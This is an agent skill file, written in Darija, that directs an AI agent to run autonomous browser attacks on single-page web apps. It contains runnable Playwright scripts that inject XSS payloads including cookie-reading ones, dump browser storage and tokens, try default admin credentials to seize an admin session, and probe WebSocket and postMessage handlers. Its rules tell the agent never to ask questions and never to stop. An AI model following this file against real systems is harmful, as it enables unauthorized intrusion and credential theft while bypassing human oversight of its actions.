---
name: e5tira9-browser
description: "Browser testing otomatique — SPA, Playwright, DOM XSS, JS analysis, client-side storage. Phase thaletha fel e5tira9. Darija."
---

# E5tira9 Browser — Testing SPAs Autonome

Skill mte3 browser testing. Bech tlawej 3la DOM XSS, JS secrets, SPA routes, client-side storage.

## Qawa3d

1. MATSE2EL CHI HAJA
2. Kol action → `[FEED] HH:MM:SS | BROWSER | <action> | <result>`
3. Testi KOL JS bundle
4. MAT9AFCH 7atta tlawej 3la kol Hajja

## Workflow

### Step 1: SPA Route Discovery
```
shannon_browser script="
await page.goto('<target>');
const scripts = await page.evaluate(() => 
  Array.from(document.querySelectorAll('script[src]')).map(s => s.src)
);
console.log(JSON.stringify(scripts, null, 2));

// Discover routes
const routes = await page.evaluate(() => {
  const links = Array.from(document.querySelectorAll('a[href]'));
  return links.map(a => a.href).filter(h => h.includes('<target>'));
});
console.log('Routes: ' + JSON.stringify(routes));
"
[FEED] 16:00:00 | BROWSER | route discovery | 25 routes found
```

### Step 2: JS Bundle Analysis
```
# Analyse kol JS bundle
shannon_js_analyze target="<target>" url="<target>/main.js"
shannon_js_analyze target="<target>" url="<target>/vendor.js"
shannon_js_analyze target="<target>" url="<target>/chunk-1.js"
[FEED] 16:05:00 | BROWSER | JS analysis | 3 API keys, 15 endpoints, 2 XSS sinks
```

### Step 3: DOM XSS Testing
```
# URL fragment
shannon_browser script="
await page.goto('<target>/#/?q=<img src=x onerror=alert(1)>');
const content = await page.content();
if (content.includes('onerror')) console.log('VULN: DOM XSS in fragment');
"

# Search parameter
shannon_browser script="
await page.goto('<target>/search?q=<img src=x onerror=alert(document.cookie)>');
const content = await page.content();
if (content.includes('onerror')) console.log('VULN: Reflected XSS');
"

# Hash-based
shannon_browser script="
await page.goto('<target>/#<script>alert(1)</script>');
await page.waitForTimeout(2000);
const content = await page.content();
if (content.includes('alert(1)')) console.log('VULN: Hash XSS');
"
[FEED] 16:10:00 | BROWSER | DOM XSS | vulnerable in /search
```

### Step 4: Client-Side Storage
```
shannon_browser script="
await page.goto('<target>');
const storage = await page.evaluate(() => ({
  localStorage: Object.entries(localStorage),
  sessionStorage: Object.entries(sessionStorage),
  cookies: document.cookie
}));
console.log('Storage: ' + JSON.stringify(storage, null, 2));
"
[FEED] 16:15:00 | BROWSER | storage analysis | JWT token in localStorage
```

### Step 5: Authentication Flow Testing
```
shannon_browser script="
await page.goto('<target>/login');
await page.fill('#email', 'admin@target');
await page.fill('#password', 'admin123');
await page.click('#loginButton');
await page.waitForTimeout(2000);
const token = await page.evaluate(() => localStorage.getItem('token'));
console.log('Token: ' + token);
const cookies = await page.evaluate(() => document.cookie);
console.log('Cookies: ' + cookies);
"
[FEED] 16:20:00 | BROWSER | auth flow | admin token obtained
```

### Step 6: Admin Panel Access
```
shannon_browser script="
await page.goto('<target>/login');
await page.fill('#email', 'admin@target');
await page.fill('#password', 'admin123');
await page.click('#loginButton');
await page.waitForTimeout(2000);
await page.goto('<target>/admin');
await page.waitForTimeout(2000);
const content = await page.content();
if (content.includes('Admin Panel') || content.includes('Dashboard')) 
  console.log('VULN: Admin panel accessible');
await page.screenshot({ path: '/workspace/admin-panel.png' });
console.log('Screenshot saved');
"
[FEED] 16:25:00 | BROWSER | admin access | panel accessible, screenshot saved
```

### Step 7: WebSocket Testing
```
shannon_browser script="
await page.goto('<target>');
const wsInfo = await page.evaluate(() => {
  const ws = new WebSocket('ws://<target>/ws');
  return new Promise(resolve => {
    ws.onopen = () => { resolve('WebSocket connected'); };
    ws.onmessage = (e) => { resolve('Message: ' + e.data); };
    ws.onerror = () => { resolve('WebSocket error'); };
  });
});
console.log(wsInfo);
"
[FEED] 16:30:00 | BROWSER | WebSocket | connection established
```

### Step 8: PostMessage Testing
```
shannon_browser script="
await page.goto('<target>');
const result = await page.evaluate(() => {
  window.postMessage({type: 'admin', data: 'test'}, '*');
  return 'PostMessage sent';
});
console.log(result);
"
[FEED] 16:35:00 | BROWSER | postMessage | no origin validation
```

## Loota ma tlqot chi Hajja

- Jarrab fragments mokhtelfin: `#/`, `#!/`, `#?`
- Jarrab m3a events mokhtelfin: `onmouseover`, `onfocus`, `onerror`
- Analysi kol JS bundles m3a shannon_js_analyze
- Jarrab CORS: `Access-Control-Allow-Origin: *`
- Testi service workers
- Jarrab IndexedDB
- Testi WebRTC leaks

MAT9AFCH — e5tira9 mch 5 dolar.
